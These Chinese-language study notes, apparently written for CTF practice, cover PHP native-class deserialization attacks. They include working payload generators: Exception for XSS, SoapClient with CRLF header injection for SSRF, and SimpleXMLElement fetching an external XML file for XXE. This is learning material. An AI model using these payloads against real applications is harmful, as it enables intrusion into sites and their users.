## 原生自带类参考

https://xz.aliyun.com/news/8792

https://www.anquanke.com/post/id/264823

https://blog.csdn.net/cjdgg/article/details/115314651

## 利用条件

1. 有触发魔术方法
2. 魔术方法有利用类
3. 部分自带类拓展开启

## 生成原生类代码

```
<?php  
$classes = get_declared_classes();  
foreach ($classes as $class) {  
    $methods = get_class_methods($class);  
    foreach ($methods as $method) {  
        if (in_array($method, array(  
            '__construct',  
            '__destruct',  
            '__toString',  
            '__wakeup',  
            '__call',  
            '__callStatic',  
            '__get',  
            '__set',  
            '__isset',  
            '__unset',  
            '__invoke',  
            '__set_state'  
        ))) {  
            print $class . '::' . $method . "\n";  
        }  
    }  
}
```

## php原生类反序列化利用

### 使用Error/Exception类进行XSS

```
<?php
highlight_file(__file__);
$a = unserialize($_GET['code']);
echo $a;
?>
```

- 攻击代码
```
<?php
$a=new Exception("<script>alert('xiaodi')</script>");
echo urlencode(serialize($a));
?>
```

- 输出对象可调用__toString

- 无代码通过原生类Exception

- Exception使用查询编写利用

- 通过访问触发输出产生XSS漏洞

### 使用SoapClient进行XSS

```
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```

攻击代码

```
<?php

$ua="aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";

$client=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));

echo urlencode(serialize($client));

?>
```

- 输出对象可调用__call

- 无代码通过原生类SoapClient

- SoapClient使用查询编写利用

- 通过访问触发服务器SSRF漏洞

### 使用SimpleXMLElement类进行xxe

```
<?php
$sxe=new SimpleXMLElement('http://192.168.1.4:82/76/oob.xml',2,true);
$a = serialize($sxe);
echo $a;
?>
```

- 不存在的方法触发__construct

- 无代码通过原生类SimpleXMLElement

- SimpleXMLElement使用查询编写利用
